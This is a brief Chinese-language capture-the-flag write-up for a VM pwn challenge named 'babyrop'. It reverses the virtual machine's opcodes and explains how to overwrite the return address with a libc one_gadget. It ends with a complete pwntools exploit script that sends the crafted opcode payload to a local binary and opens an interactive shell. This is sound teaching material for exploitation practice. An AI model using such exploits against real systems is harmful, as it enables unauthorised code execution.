# babyrop
一个简单的vmpwn，通过虚拟机指令能修改返回地址为Onegadget
逆向一下一些指令：

0x28：pop10 ，sp指针下移10  

0x15: push longlong  

0x38:mov [rsp+8],0  

0x56:mov [rsp],int  

0x34:mov [rsp-8],[rsp] ;   rsp --    

0x21:add [rsp-8],[rsp]  

先将sp指针指向rbp + 8附近,因此通过pop10进行。注意pop10只能调用两次，且为了避免len == 0的检测，穿插一次push即可。  
然后找到一个Libc中的地址，通过0x56进行赋值和0x21相加构造one_gadget地址，为了保证one_gadget的触发，需要通过0x38进行赋0。  

```
from pwn import *
r = process('./bin')
#r = remote('')
context.log_level = 'debug'


payload =  chr(0x28)                 #pop10
payload += chr(0x15) + p64(0)        #push 1
payload += chr(0x28)                 #pop10
payload += chr(0x38)                 #mov [rsp+8],0
payload += chr(0x56) + p32(0x24a3a)  #mov [rsp],0x24a3a
payload += chr(0X34)                 #mov [rsp-8],[rsp]   rsp -=8 
payload += chr(0x21)                 #add [rsp-8],[rsp]                          
payload += chr(0X34)*5               #mov [rsp-8],[rsp]   rsp -=8

r.sendline(payload)
r.interactive()
```
`